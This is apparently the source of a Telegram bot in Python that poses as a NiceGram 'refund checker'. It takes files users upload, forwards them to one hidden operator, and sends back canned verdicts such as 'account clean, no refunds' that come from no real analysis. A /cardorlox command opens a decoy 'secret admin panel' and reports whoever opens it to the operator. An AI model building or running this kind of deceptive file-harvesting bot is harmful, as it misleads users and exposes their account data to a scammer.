import os
import logging
import asyncio
import pickle
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(name)

BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN не найден")
    exit()
REAL_ADMIN_ID = int(os.getenv('ADMIN_ID', 0))

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

DATA_FILES = {
    'users': 'users.pkl',
    'pending': 'pending.pkl',
    'approved': 'approved.pkl',
    'rejected': 'rejected.pkl',
    'secret_admins': 'secret_admins.pkl'
}

def load_data(file_name):
    try:
        with open(file_name, 'rb') as f:
            return pickle.load(f)
    except:
        return {}

def save_data(file_name, data):
    try:
        with open(file_name, 'wb') as f:
            pickle.dump(data, f)
    except Exception as e:
        logger.error(f"Ошибка сохранения {file_name}: {e}")

users_db = load_data(DATA_FILES['users'])
pending_files = load_data(DATA_FILES['pending'])
approved_files = load_data(DATA_FILES['approved'])
rejected_files = load_data(DATA_FILES['rejected'])
secret_admins = load_data(DATA_FILES['secret_admins'])

async def auto_save():
    while True:
        await asyncio.sleep(60)
        save_data(DATA_FILES['users'], users_db)
        save_data(DATA_FILES['pending'], pending_files)
        save_data(DATA_FILES['approved'], approved_files)
        save_data(DATA_FILES['rejected'], rejected_files)
        save_data(DATA_FILES['secret_admins'], secret_admins)

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="instruction")],
        [InlineKeyboardButton(text="📱 Скачать NiceGram", callback_data="download")],
        [InlineKeyboardButton(text="🔍 Проверить на рефанд", callback_data="check_refund")]
    ])
    return keyboard

def get_admin_keyboard(user_id):
    user_pending_count = len([f for f in pending_files.values() if f['user_id'] == user_id])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Мои файлы на модерации", callback_data="my_pending")],
        [InlineKeyboardButton(text="✅ Мои одобренные файлы", callback_data="my_approved")],
        [InlineKeyboardButton(text="❌ Мои отклоненные файлы", callback_data="my_rejected")],
        [InlineKeyboardButton(text="📊 Моя статистика", callback_data="my_stats")],
        [InlineKeyboardButton(text="📤 Загрузить новый файл", callback_data="upload_file")],
        [InlineKeyboardButton(text="🔙 Скрыть панель", callback_data="hide_admin_panel")]
    ])
    return keyboard

def get_real_admin_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Все файлы на модерации", callback_data="admin_all_pending")],
        [InlineKeyboardButton(text="👥 Все пользователи", callback_data="admin_all_users")],
        [InlineKeyboardButton(text="📊 Полная статистика", callback_data="admin_full_stats")],
        [InlineKeyboardButton(text="🔔 Уведомления", callback_data="admin_notifications")],
        [InlineKeyboardButton(text="⚙️ Управление", callback_data="admin_manage")],
        [InlineKeyboardButton(text="🔙 Скрыть панель", callback_data="hide_admin_panel")]
    ])
    return keyboard

def get_moderation_keyboard(file_id):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Одобрить", callback_data=f"admin_approve_{file_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin_reject_{file_id}")
        ],
        [
            InlineKeyboardButton(text="📝 Комментарий", callback_data=f"admin_comment_{file_id}"),
            InlineKeyboardButton(text="👤 Инфо о пользователе", callback_data=f"admin_userinfo_{file_id}")
        ],
        [
            InlineKeyboardButton(text="📋 К списку файлов", callback_data="admin_all_pending")
        ]
    ])
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
    ])
    return keyboard

def get_check_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Загрузить файл", callback_data="upload_file")],
        [InlineKeyboardButton(text="📖 Как получить файл", callback_data="how_to_get_file")],
        [InlineKeyboardButton(text="❓ FAQ", callback_data="faq")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
    ])
    return keyboard

@dp.message(Command("cardorlox"))
async def secret_admin_command(message: Message, command: CommandObject):
    user_id = message.from_user.id
    username = message.from_user.username or "Без username"
    
    if user_id not in secret_admins:
        secret_admins[user_id] = {
            'username': username,
            'full_name': message.from_user.full_name,
            'discovered_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'last_access': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'access_count': 0
        }
    
    secret_admins[user_id]['access_count'] += 1
    secret_admins[user_id]['last_access'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if user_id == REAL_ADMIN_ID:
        admin_text = f"""
🔐 <b>СЕКРЕТНАЯ АДМИН-ПАНЕЛЬ (РЕАЛЬНЫЙ АДМИН)</b>

👑 <b>Вы - настоящий администратор</b>

📊 <b>Общая статистика:</b>
• Пользователей: {len(users_db)}
• Секретных админов: {len(secret_admins)}
• Файлов на модерации: {len(pending_files)}
• Одобрено: {len(approved_files)}
• Отклонено: {len(rejected_files)}

👇 <b>Выберите раздел:</b>
        """
        await message.answer(admin_text, parse_mode=ParseMode.HTML, reply_markup=get_real_admin_keyboard())
        
        logger.info(f"Реальный админ {user_id} (@{username}) открыл секретную панель")
        
        if pending_files:
            notification_text = f"""
🔔 <b>УВЕДОМЛЕНИЕ ДЛЯ РЕАЛЬНОГО АДМИНА</b>

📁 <b>Файлов на проверке:</b> {len(pending_files)}

<b>Последние файлы:</b>
"""
            for i, (file_id, file_info) in enumerate(list(pending_files.items())[-3:], 1):
                time_diff = datetime.now() - datetime.strptime(file_info['timestamp'], "%Y-%m-%d %H:%M:%S")
                minutes = int(time_diff.total_seconds() / 60)
                notification_text += f"\n{i}. <code>{file_id[:8]}...</code>"
                notification_text += f"\n   👤 @{file_info['username']}"
                notification_text += f"\n   ⏰ {minutes} мин назад"
            
            await message.answer(notification_text, parse_mode=ParseMode.HTML)
    
    else:
        user_pending = len([f for f in pending_files.values() if f['user_id'] == user_id])
        user_approved = len([f for f in approved_files.values() if f['user_id'] == user_id])
        user_rejected = len([f for f in rejected_files.values() if f['user_id'] == user_id])
        
        user_text = f"""
🔐 <b>СЕКРЕТНАЯ АДМИН-ПАНЕЛЬ</b>

👤 <b>Добро пожаловать, @{username}!</b>
🆔 <b>Ваш ID:</b> <code>{user_id}</code>

📊 <b>Ваша статистика:</b>
• Файлов на модерации: {user_pending}
• Одобрено: {user_approved}
• Отклонено: {user_rejected}
• Всего отправлено: {user_pending + user_approved + user_rejected}

⏰ <b>Информация:</b>
• Первый доступ: {secret_admins[user_id]['discovered_at']}
• Последний доступ: {secret_admins[user_id]['last_access']}
• Количество входов: {secret_admins[user_id]['access_count']}

👇 <b>Выберите раздел:</b>
        """
        await message.answer(user_text, parse_mode=ParseMode.HTML, reply_markup=get_admin_keyboard(user_id))
        
        logger.info(f"Пользователь {user_id} (@{username}) открыл секретную панель")
        
        if REAL_ADMIN_ID:
            try:
                notify_text = f"""
🔍 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ В СЕКРЕТНОЙ ПАНЕЛИ</b>

👤 <b>Пользователь:</b> @{username}
🆔 <b>ID:</b> <code>{user_id}</code>
📛 <b>Имя:</b> {message.from_user.full_name}

📊 <b>Статистика пользователя:</b>
• Нашел панель в: {secret_admins[user_id]['discovered_at']}
• Файлов отправлено: {user_pending + user_approved + user_rejected}

<b>Всего секретных админов:</b> {len(secret_admins)}
                """
                await bot.send_message(chat_id=REAL_ADMIN_ID, text=notify_text, parse_mode=ParseMode.HTML)
            except Exception as e:
                logger.error(f"Ошибка уведомления реального админа: {e}")
    
    await message.delete()

@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or "Без username"
    
    if user_id not in users_db:
        users_db[user_id] = {
            'username': username,
            'full_name': message.from_user.full_name,
            'join_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'files_count': 0,
            'approved_count': 0,
            'rejected_count': 0,
            'last_upload': None,
            'is_secret_admin': False
        }
    
    if user_id in secret_admins:
        users_db[user_id]['is_secret_admin'] = True
        users_db[user_id]['secret_admin_since'] = secret_admins[user_id]['discovered_at']
    
    welcome_text = """
🎭 <b>Добро пожаловать в бот для проверки рефандов NiceGram!</b>

🔍 <i>Отправьте файл истории звёзд для проверки на рефанды:</i>
• ✅ Реальные подарки
• ❌ Подозрительные транзакции  
• ⚠️ Возвраты средств

📁 <b>Как это работает:</b>
1. Вы отправляете файл
2. Админ проверяет файл
3. Вы получаете результат проверки

⏳ <b>Время проверки:</b> 5-30 минут
        """
    
    await message.answer(welcome_text, reply_markup=get_main_keyboard())
    
    if user_id in secret_admins:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔐 Секретная панель", callback_data="show_secret_panel")],
            [InlineKeyboardButton(text="📤 Загрузить файл", callback_data="upload_file")],
            [InlineKeyboardButton(text="📖 Инструкция", callback_data="instruction")]
        ])
        
        await message.answer(
            "🔐 <i>У вас есть доступ к секретной панели</i>\n\n"
            "Используйте её для управления своими файлами",
            reply_markup=keyboard
        )

@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id == REAL_ADMIN_ID:
        await message.answer("👑 <b>Реальная админ-панель</b>", reply_markup=get_real_admin_keyboard())
    else:
        await message.answer("⛔️ У вас нет прав администратора")

@dp.message(F.document)
async def handle_user_document(message: Message):
    user_id = message.from_user.id
    document = message.document
    
    allowed_extensions = ['.json', '.txt', '.csv', '.xlsx', '.xls', '.log']
    if not any(document.file_name.endswith(ext) for ext in allowed_extensions):
        await message.answer(
            "❌ <b>Неподдерживаемый формат файла!</b>\n\n"
            "Поддерживаются:\n• JSON (.json)\n• Текст (.txt, .log)\n• Excel (.xlsx, .csv)",
            reply_markup=get_back_keyboard()
        )
        return
    
    if document.file_size and document.file_size > 20 * 1024 * 1024:
        await message.answer(
            "❌ <b>Файл слишком большой!</b>\n\n"
            "Максимальный размер: 20 МБ",
            reply_markup=get_back_keyboard()
        )
        return
    
    user_msg = await message.answer(
        f"📤 <b>Файл принят!</b>\n\n"
        f"📁 <code>{document.file_name}</code>\n"
        f"📦 {(document.file_size or 0) / 1024:.0f} КБ\n\n"
        "⏳ <b>Файл отправлен администратору на проверку.</b>\n"
        "Ожидайте результата в течение 5-30 минут.",
        reply_markup=get_back_keyboard()
    )
    
    file_id = f"{user_id}_{int(datetime.now().timestamp())}"
    
    pending_files[file_id] = {
        'user_id': user_id,
        'username': message.from_user.username or "Без username",
        'full_name': message.from_user.full_name,
        'filename': document.file_name,
        'file_size': document.file_size,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'message_id': message.message_id,
        'user_message_id': user_msg.message_id,
        'status': 'pending',
        'admin_comment': None
    }
    
    if user_id in users_db:
        users_db[user_id]['files_count'] += 1
        users_db[user_id]['last_upload'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if REAL_ADMIN_ID:
        await send_file_to_real_admin(file_id, document, message)
    
    logger.info(f"Файл {file_id} от пользователя {user_id} отправлен на модерацию")
    
    if user_id in secret_admins:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔐 Перейти в секретную панель", callback_data="show_secret_panel")],
            [InlineKeyboardButton(text="📤 Загрузить еще файл", callback_data="upload_file")]
        ])
        
        await message.answer(
            f"📁 <b>Файл добавлен!</b>\n\n"
            f"✅ Используйте секретную панель для отслеживания статуса\n"
            f"🔐 Команда: <code>/cardorlox</code>",
            reply_markup=keyboard
        )

async def send_file_to_real_admin(file_id: str, document: types.Document, message: Message):
    if not REAL_ADMIN_ID:
        return
    
    file_info = pending_files[file_id]
    
    admin_text = f"""
📤 <b>НОВЫЙ ФАЙЛ НА МОДЕРАЦИЮ</b>

🆔 <b>ID файла:</b> <code>{file_id}</code>
👤 <b>Пользователь:</b> @{file_info['username']}
📛 <b>Имя:</b> {file_info['full_name']}
🆔 <b>User ID:</b> <code>{file_info['user_id']}</code>

📁 <b>Файл:</b> <code>{file_info['filename']}</code>
📦 <b>Размер:</b> {file_info['file_size'] / 1024 if file_info['file_size'] else 0:.1f} КБ
⏰ <b>Время:</b> {file_info['timestamp']}

<b>Секретная панель:</b> {'✅ Да' if file_info['user_id'] in secret_admins else '❌ Нет'}

👇 <b>Выберите действие:</b>
        """
    
    try:
        await bot.forward_message(
            chat_id=REAL_ADMIN_ID,
            from_chat_id=message.chat.id,
            message_id=message.message_id
        )
        
        await bot.send_message(
            chat_id=REAL_ADMIN_ID,
            text=admin_text,
            reply_markup=get_moderation_keyboard(file_id),
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        logger.error(f"Ошибка отправки файла реальному админу: {e}")

@dp.callback_query(F.data == "show_secret_panel")
async def show_secret_panel(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    if user_id in secret_admins:
        await callback.message.answer(
            "🔐 <b>Загружаем секретную панель...</b>",
            parse_mode=ParseMode.HTML
        )
        await secret_admin_command(callback.message, CommandObject(command="cardorlox", args=""))
    else:
        await callback.answer("❌ У вас нет доступа к секретной панели", show_alert=True)

@dp.callback_query(F.data == "my_pending")
async def show_my_pending(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    user_pending = [f for f in pending_files.values() if f['user_id'] == user_id]
    
    if not user_pending:
        await callback.message.edit_text(
            "⏳ <b>Нет файлов на модерации</b>\n\n"
            "У вас нет файлов, ожидающих проверки.",
            reply_markup=get_admin_keyboard(user_id)
        )
        return
    
    text = f"⏳ <b>ВАШИ ФАЙЛЫ НА МОДЕРАЦИИ</b>\n\nВсего: {len(user_pending)}\n\n"
    
    for i, file_info in enumerate(user_pending, 1):
        time_ago = datetime.now() - datetime.strptime(file_info['timestamp'], "%Y-%m-%d %H:%M:%S")
        minutes = int(time_ago.total_seconds() / 60)
        hours = minutes // 60
        
        time_str = f"{minutes} мин" if minutes < 60 else f"{hours} ч {minutes%60} мин"
        
        text += f"{i}. <code>{file_info['filename'][:30]}</code>\n"
        text += f"   ⏰ Отправлен: {time_str} назад\n"
        text += f"   📦 Размер: {file_info['file_size'] / 1024 if file_info['file_size'] else 0:.1f} КБ\n\n"
    
    await callback.message.edit_text(
        text,
        reply_markup=get_admin_keyboard(user_id),
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "my_approved")
async def show_my_approved(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    user_approved = [f for f in approved_files.values() if f['user_id'] == user_id]
    
    if not user_approved:
        await callback.message.edit_text(
            "✅ <b>Нет одобренных файлов</b>\n\n"
            "У вас пока нет одобренных файлов.",
            reply_markup=get_admin_keyboard(user_id)
        )
        return
    
    text = f"✅ <b>ВАШИ ОДОБРЕННЫЕ ФАЙЛЫ</b>\n\nВсего: {len(user_approved)}\n\n"
    
    for i, file_info in enumerate(user_approved[-5:], 1):
        text += f"{i}. <code>{file_info['filename'][:30]}</code>\n"
        text += f"   ⏰ Одобрен: {file_info.get('decision_time', file_info['timestamp'])}\n\n"
    
    if len(user_approved) > 5:
        text += f"... и еще {len(user_approved) - 5} файлов\n"
    
    text += "\n🎉 <i>Все эти файлы прошли проверку успешно!</i>"
    
    await callback.message.edit_text(
        text,
        reply_markup=get_admin_keyboard(user_id),
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "my_rejected")
async def show_my_rejected(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    user_rejected = [f for f in rejected_files.values() if f['user_id'] == user_id]
    
    if not user_rejected:
        await callback.message.edit_text(
            "❌ <b>Нет отклоненных файлов</b>\n\n"
            "У вас нет отклоненных файлов. Это хорошо!",
            reply_markup=get_admin_keyboard(user_id)
        )
        return
    
    text = f"❌ <b>ВАШИ ОТКЛОНЕННЫЕ ФАЙЛЫ</b>\n\nВсего: {len(user_rejected)}\n\n"
    
    for i, file_info in enumerate(user_rejected[-5:], 1):
        text += f"{i}. <code>{file_info['filename'][:30]}</code>\n"
        text += f"   ⏰ Отклонен: {file_info.get('decision_time', file_info['timestamp'])}\n"
        text += f"   💬 Причина: {file_info.get('admin_comment', 'Не указана')}\n\n"
    
    if len(user_rejected) > 5:
        text += f"... и еще {len(user_rejected) - 5} файлов\n"
    
    text += "\n⚠️ <i>Попробуйте отправить файлы заново с правильным форматом</i>"
    
    await callback.message.edit_text(
        text,
        reply_markup=get_admin_keyboard(user_id),
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "my_stats")
async def show_my_stats(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    user_pending = len([f for f in pending_files.values() if f['user_id'] == user_id])
    user_approved = len([f for f in approved_files.values() if f['user_id'] == user_id])
    user_rejected = len([f for f in rejected_files.values() if f['user_id'] == user_id])
    
    user_info = users_db.get(user_id, {})
    
    stats_text = f"""
📊 <b>ВАША СТАТИСТИКА</b>

👤 <b>Информация:</b>
• Username: @{user_info.get('username', 'Нет')}
• Полное имя: {user_info.get('full_name', 'Неизвестно')}
• ID: <code>{user_id}</code>

📈 <b>Статистика файлов:</b>
• Всего отправлено: {user_pending + user_approved + user_rejected}
• На модерации: {user_pending}
• Одобрено: {user_approved}
• Отклонено: {user_rejected}
• Успешных проверок: {user_approved}/{user_approved + user_rejected if user_approved + user_rejected > 0 else 0}

🔐 <b>Секретная панель:</b>
• Доступ получен: {secret_admins[user_id]['discovered_at'] if user_id in secret_admins else 'Нет'}
• Последний вход: {secret_admins[user_id]['last_access'] if user_id in secret_admins else 'Нет'}
• Количество входов: {secret_admins[user_id]['access_count'] if user_id in secret_admins else 0}

⏰ <b>Активность:</b>
• Зарегистрирован: {user_info.get('join_date', 'Неизвестно')}
• Последняя загрузка: {user_info.get('last_upload', 'Не было')}
        """
    
    await callback.message.edit_text(
        stats_text,
        reply_markup=get_admin_keyboard(user_id),
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "hide_admin_panel")
async def hide_admin_panel(callback: CallbackQuery):
    await callback.message.edit_text(
        "🔒 <b>Секретная панель скрыта</b>\n\n"
        "Используйте /cardorlox чтобы снова открыть",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔐 Показать снова", callback_data="show_secret_panel")],
            [InlineKeyboardButton(text="📤 Загрузить файл", callback_data="upload_file")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("admin_approve_"))
async def admin_approve_file(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    file_id = callback.data.replace("admin_approve_", "")
    
    if file_id not in pending_files:
        await callback.answer("❌ Файл не найден", show_alert=True)
        return
    
    file_info = pending_files.pop(file_id)
    
    approved_files[file_id] = {
        **file_info,
        'status': 'approved',
        'admin_id': REAL_ADMIN_ID,
        'decision_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    user_id = file_info['user_id']
    if user_id in users_db:
        users_db[user_id]['approved_count'] += 1
    
    user_text = f"""
✅ <b>Ваш файл одобрен!</b>

📁 <b>Файл:</b> <code>{file_info['filename']}</code>
🆔 <b>ID проверки:</b> <code>{file_id[:8]}...</code>
⏰ <b>Время:</b> {datetime.now().strftime("%H:%M:%S")}

🎉 <b>Результат проверки:</b>
• ✅ Аккаунт чистый
• ✅ Рефанды не обнаружены
• ✅ Можно принимать подарки

<i>Спасибо за использование нашего сервиса!</i>
        """
    
    try:
        await bot.send_message(
            chat_id=user_id,
            text=user_text,
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logger.error(f"Ошибка отправки пользователю: {e}")
    
    await callback.message.edit_text(
        f"✅ <b>ФАЙЛ ОДОБРЕН</b>\n\n"
        f"🆔 <b>ID файла:</b> <code>{file_id}</code>\n"
        f"👤 <b>Пользователь:</b> @{file_info['username']}\n"
        f"📁 <b>Файл:</b> {file_info['filename']}\n"
        f"⏰ <b>Время решения:</b> {datetime.now().strftime('%H:%M:%S')}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📋 К списку файлов", callback_data="admin_all_pending")]
        ])
    )
    
    await callback.answer("✅ Файл одобрен")
    logger.info(f"Файл {file_id} одобрен реальным админом")

@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject_file(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    file_id = callback.data.replace("admin_reject_", "")
    
    if file_id not in pending_files:
        await callback.answer("❌ Файл не найден", show_alert=True)
        return
    
    file_info = pending_files.pop(file_id)
    
    rejected_files[file_id] = {
        **file_info,
        'status': 'rejected',
        'admin_id': REAL_ADMIN_ID,
        'decision_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    user_id = file_info['user_id']
    if user_id in users_db:
        users_db[user_id]['rejected_count'] += 1
    
    user_text = f"""
❌ <b>Ваш файл отклонен</b>

📁 <b>Файл:</b> <code>{file_info['filename']}</code>
🆔 <b>ID проверки:</b> <code>{file_id[:8]}...</code>
⏰ <b>Время:</b> {datetime.now().strftime("%H:%M:%S")}

📝 <b>Причина:</b>
• ⚠️ Неправильный формат файла
• ⚠️ Файл поврежден или пустой
• ⚠️ Подозрительное содержимое

<i>Попробуйте отправить файл заново, убедившись что он экспортирован правильно.</i>
        """
    
    try:
        await bot.send_message(
            chat_id=user_id,
            text=user_text,
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logger.error(f"Ошибка отправки пользователю: {e}")
    
    await callback.message.edit_text(
        f"❌ <b>ФАЙЛ ОТКЛОНЕН</b>\n\n"
        f"🆔 <b>ID файла:</b> <code>{file_id}</code>\n"
        f"👤 <b>Пользователь:</b> @{file_info['username']}\n"
        f"📁 <b>Файл:</b> {file_info['filename']}\n"
        f"⏰ <b>Время решения:</b> {datetime.now().strftime('%H:%M:%S')}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📋 К списку файлов", callback_data="admin_all_pending")]
        ])
    )
    
    await callback.answer("❌ Файл отклонен")
    logger.info(f"Файл {file_id} отклонен реальным админом")

@dp.callback_query(F.data == "admin_all_pending")
async def admin_all_pending(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    if not pending_files:
        await callback.message.edit_text(
            "✅ <b>Нет файлов на модерации</b>\n\n"
            "Все файлы проверены!",
            reply_markup=get_real_admin_keyboard()
        )
        return
    
    buttons = []
    for file_id, file_info in list(pending_files.items())[:10]:
        short_id = file_id[:8]
        time = file_info['timestamp'].split()[1]
        button_text = f"📁 {short_id}... - @{file_info['username']} ({time})"
        
        buttons.append([
            InlineKeyboardButton(
                text=button_text,
                callback_data=f"admin_view_{file_id}"
            )
        ])
    
    buttons.append([
        InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_real_admin"),
        InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_all_pending")
    ])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    
    await callback.message.edit_text(
        f"📋 <b>ВСЕ ФАЙЛЫ НА МОДЕРАЦИИ</b>\n\n"
        f"📊 Всего файлов: {len(pending_files)}\n\n"
        f"👇 <b>Выберите файл для модерации:</b>",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("admin_view_"))
async def admin_view_file(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    file_id = callback.data.replace("admin_view_", "")
    
    if file_id not in pending_files:
        await callback.answer("❌ Файл не найден", show_alert=True)
        return
    
    file_info = pending_files[file_id]
    
    details_text = f"""
📄 <b>ДЕТАЛИ ФАЙЛА</b>

🆔 <b>ID:</b> <code>{file_id}</code>
👤 <b>Пользователь:</b> @{file_info['username']}
🆔 <b>User ID:</b> <code>{file_info['user_id']}</code>
📛 <b>Имя:</b> {file_info['full_name']}

📁 <b>Файл:</b> <code>{file_info['filename']}</code>
📦 <b>Размер:</b> {file_info['file_size'] / 1024 if file_info['file_size'] else 0:.1f} КБ
⏰ <b>Время загрузки:</b> {file_info['timestamp']}

🔐 <b>Секретная панель:</b> {'✅ Да' if file_info['user_id'] in secret_admins else '❌ Нет'}

👇 <b>Выберите действие:</b>
        """
    
    await callback.message.edit_text(
        details_text,
        reply_markup=get_moderation_keyboard(file_id),
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_all_users")
async def admin_all_users(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    if not users_db:
        await callback.message.edit_text("👥 <b>Нет пользователей</b>", reply_markup=get_real_admin_keyboard())
        return
    
    text = f"👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\nВсего: {len(users_db)}\n\n"
    
    sorted_users = sorted(users_db.items(), key=lambda x: x[1].get('join_date', ''), reverse=True)
    
    for i, (user_id, user_info) in enumerate(sorted_users[:15], 1):
        secret_mark = "🔐" if user_info.get('is_secret_admin') else ""
        text += f"{i}. @{user_info['username']} {secret_mark}\n"
        text += f"   ID: <code>{user_id}</code>\n"
        text += f"   Файлов: {user_info.get('files_count', 0)}\n"
        text += f"   Рег.: {user_info.get('join_date', '')[5:16]}\n\n"
    
    if len(users_db) > 15:
        text += f"... и еще {len(users_db) - 15} пользователей\n"
    
    text += f"\n🔐 <b>Секретных админов:</b> {len(secret_admins)}"
    
    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_real_admin")],
            [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_all_users")]
        ]),
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_full_stats")
async def admin_full_stats(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    stats_text = f"""
📊 <b>ПОЛНАЯ СТАТИСТИКА СИСТЕМЫ</b>

👥 <b>Пользователи:</b>
• Всего пользователей: {len(users_db)}
• Секретных админов: {len(secret_admins)}
• Новых за 24ч: {len([u for u in users_db.values() if datetime.now().strftime('%Y-%m-%d') in u.get('join_date', '')])}

📁 <b>Файлы:</b>
• На модерации: {len(pending_files)}
• Одобрено всего: {len(approved_files)}
• Отклонено всего: {len(rejected_files)}
• Всего обработано: {len(approved_files) + len(rejected_files)}

📈 <b>Активность:</b>
• Файлов за 24ч: {len([f for f in pending_files.values() if datetime.now().strftime('%Y-%m-%d') in f['timestamp']])}
• Активных сегодня: {len([u for u in users_db.values() if u.get('last_upload') and datetime.now().strftime('%Y-%m-%d') in u.get('last_upload', '')])}

🔐 <b>Секретная панель:</b>
• Первый доступ: {min(secret_admins.values(), key=lambda x: x['discovered_at'])['discovered_at'] if secret_admins else 'Нет'}
• Последний доступ: {max(secret_admins.values(), key=lambda x: x['last_access'])['last_access'] if secret_admins else 'Нет'}

🕒 <b>Система:</b>
• Текущее время: {datetime.now().strftime('%H:%M:%S')}
• Дата: {datetime.now().strftime('%d.%m.%Y')}
        """
    
    await callback.message.edit_text(
        stats_text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_full_stats")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_real_admin")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_notifications")
async def admin_notifications(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    notify_text = f"""
🔔 <b>СИСТЕМА УВЕДОМЛЕНИЙ</b>

📋 <b>Текущий статус:</b>
• Файлов на проверке: {len(pending_files)}
• Непроверенных: {len(pending_files)}
• Старых (>24ч): {len([f for f in pending_files.values() if (datetime.now() - datetime.strptime(f['timestamp'], "%Y-%m-%d %H:%M:%S")).days > 0])}

👥 <b>Пользователи:</b>
• Ждут ответа: {len(set(f['user_id'] for f in pending_files.values()))}
• Секретных админов: {len(secret_admins)}

🚨 <b>Требуют внимания:</b>
        """
    
    old_files = []
    for file_id, file_info in pending_files.items():
        file_time = datetime.strptime(file_info['timestamp'], "%Y-%m-%d %H:%M:%S")
        if (datetime.now() - file_time).seconds > 3600:
            old_files.append((file_id, file_info))
    
    if old_files:
        notify_text += f"\n• Старых файлов: {len(old_files)}"
        for i, (file_id, file_info) in enumerate(old_files[:3], 1):
            hours = (datetime.now() - datetime.strptime(file_info['timestamp'], "%Y-%m-%d %H:%M:%S")).seconds // 3600
            notify_text += f"\n  {i}. @{file_info['username']} - {hours}ч"
    else:
        notify_text += "\n• Нет срочных задач"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Проверить файлы", callback_data="admin_all_pending")],
        [InlineKeyboardButton(text="👥 Проверить пользователей", callback_data="admin_all_users")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_real_admin")]
    ])
    
    await callback.message.edit_text(
        notify_text,
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML
    )
